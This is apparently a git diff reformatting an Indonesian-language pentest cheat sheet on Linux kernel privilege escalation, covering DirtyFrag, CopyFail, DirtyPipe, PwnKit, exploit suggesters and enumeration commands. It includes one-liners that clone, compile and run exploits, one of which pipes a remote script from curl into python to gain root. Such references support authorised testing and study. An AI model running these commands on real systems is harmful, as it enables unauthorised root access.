@@ -8,12 +8,13 @@ LPE kernel TERBARU, DETERMINISTIK (bukan race). Cek kernel dulu:
 uname -r
 ```
 
-| Kernel | Vulnerable |
-|--------|------------|
+| Kernel                        | Vulnerable                                                   |
+| ----------------------------- | ------------------------------------------------------------ |
 | Ubuntu 5.15.0-XXX (XXX < 181) | dirtyfrag (CVE-2026-43284/43500) + copyfail (CVE-2026-31431) |
-| Debian 5.10.0-9 | DirtyPipe (CVE-2022-0847) + copyfail subset |
+| Debian 5.10.0-9               | DirtyPipe (CVE-2022-0847) + copyfail subset                  |
 
 ### DirtyFrag (CVE-2026-43284/43500)
+
 ```bash
 # One-liner: clone, compile, execute
 git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
@@ -22,27 +23,49 @@ git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wal
 > **Catatan:** dirtyfrag butuh modul esp4/esp6/rxrpc (cek: `lsmod` / `modinfo`)
 
 ### CopyFail (CVE-2026-31431)
+
 ```bash
 # One-liner: download & execute
 curl https://copy.fail/exp | python3 && su
 ```
 
 ### Langkah Umum
-1. `uname -r` -> tentukan versi
-2. Ambil PoC dari sumber publik (repo resmi penemu)
-3. Compile di target (`gcc`) ATAU transfer binary yang cocok GLIBC
-4. Jalankan -> root deterministik
-5. Verifikasi: `id` (uid/euid=0)
+
+```text
+1. uname -r
+   → Tentukan versi kernel
+
+2. Ambil PoC
+   → Gunakan sumber publik/repository penemu
+
+3. Compile di target
+   → gcc
+   ATAU
+   → Transfer binary yang sesuai dengan GLIBC
+
+4. Jalankan PoC
+   → Uji apakah privilege escalation berhasil
+
+5. Verifikasi
+   → id
+   → uid/euid=0 berarti root
+```
+
+---
 
 ## Linux Exploit Suggester
 
 Tool otomatis untuk suggest kernel exploit berdasarkan versi kernel target.
 
 ### Sumber
-- https://github.com/The-Z-Labs/linux-exploit-suggester (LES)
-- https://github.com/jondonas/linux-exploit-suggester-2 (LES2 - Perl)
+
+- https://github.com/The-Z-Labs/linux-exploit-suggester
+  - LES
+- https://github.com/jondonas/linux-exploit-suggester-2
+  - LES2 - Perl
 
 ### Cara Pakai
+
 ```bash
 # Di target: ambil versi kernel
 uname -r
@@ -52,23 +75,97 @@ uname -r
 ```
 
 ### Output
+
 Tool akan menampilkan:
-- Kernel version
-- List CVE yang mungkin vulnerable
-- Link ke exploit/PoC
-- Tingkat exposure (highly probable, probable, less probable)
 
-> Fokus pada hasil **[CVE-xxx] highly probable** terlebih dahulu.
+```text
+Kernel version
+List CVE yang mungkin vulnerable
+Link ke exploit/PoC
+Tingkat exposure:
+- highly probable
+- probable
+- less probable
+```
 
-## Kernel Exploit (umum)
+> **Fokus pada hasil `[CVE-xxx] highly probable` terlebih dahulu.**
+
+---
+
+## Kernel Exploit (Umum)
+
 ```bash
 uname -r                                     # versi kernel
 searchsploit linux kernel <versi>            # cari exploit lokal
 ```
 
-Contoh exploit populer:
-- DirtyPipe (5.8 - 5.10.x)
-- DirtyCOW (lama)
-- PwnKit (pkexec)
+### Contoh Exploit Populer
 
-Cross-check versi vs patch sebelum jalankan. Compile di target jika bisa.
+```text
+DirtyPipe
+CVE-2022-0847
+# Vulnerability pada Linux kernel yang dapat digunakan untuk privilege escalation
+# pada kernel yang terdampak.
+
+DirtyCOW
+# Vulnerability kernel lama yang berkaitan dengan race condition
+# pada mekanisme copy-on-write.
+
+PwnKit
+CVE-2021-4034
+# Local Privilege Escalation pada pkexec/polkit.
+```
+
+### Cross-Check
+
+```text
+Kernel Version
+      ↓
+Distro / OS Version
+      ↓
+Patch Level
+      ↓
+CVE
+      ↓
+Exploit Compatibility
+      ↓
+PoC
+      ↓
+Privilege Escalation
+```
+
+> **Catatan:** Cross-check versi kernel dengan patch sebelum menjalankan exploit.
+> Compile di target jika memungkinkan.
+
+---
+
+## Quick Enumeration
+
+```bash
+# Cek kernel
+uname -r
+
+# Cek informasi OS
+cat /etc/os-release
+
+# Cek user dan privilege
+id
+sudo -l
+
+# Cek kernel module yang relevan
+lsmod
+modinfo <MODULE>
+```
+
+## Verifikasi Root
+
+```bash
+id
+
+# Jika berhasil privilege escalation:
+# uid=0(root)
+# euid=0(root)
+```
+
+> **Catatan:** Kernel LPE hanya boleh diuji pada sistem yang dimiliki atau
+> secara eksplisit diizinkan untuk pengujian keamanan.
